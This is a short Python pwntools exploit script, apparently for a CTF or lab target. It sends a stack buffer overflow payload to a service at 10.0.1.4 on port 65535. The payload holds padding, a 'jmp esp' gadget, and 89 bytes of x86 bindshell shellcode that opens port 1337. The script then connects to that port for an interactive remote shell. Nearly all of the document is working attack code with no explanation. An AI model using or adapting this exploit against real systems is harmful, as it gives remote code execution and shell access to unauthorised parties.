from pwn import *

# bindshell 1337 - 89 bytes
shellcode = "\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80"

# self port testing
#port = int(__import__('subprocess').Popen(('netstat -ntlp'),shell=True,stdout=-1).communicate()[0].split(':')[-2][:5])

p = remote('10.0.1.4', 65535)

payload = ''.join([
    "A"*17,                         # offset padding
    p32(0x8048697),                 # jmp esp
    shellcode,                      # shellcode
    "B"*(171-len(shellcode)-4-17),  # offset padding
    p32(0x8048a32)                  # add esp,0x1c
])

p.sendlineafter('each.\n', payload)

r = remote('10.0.1.4', 1337)
r.interactive()
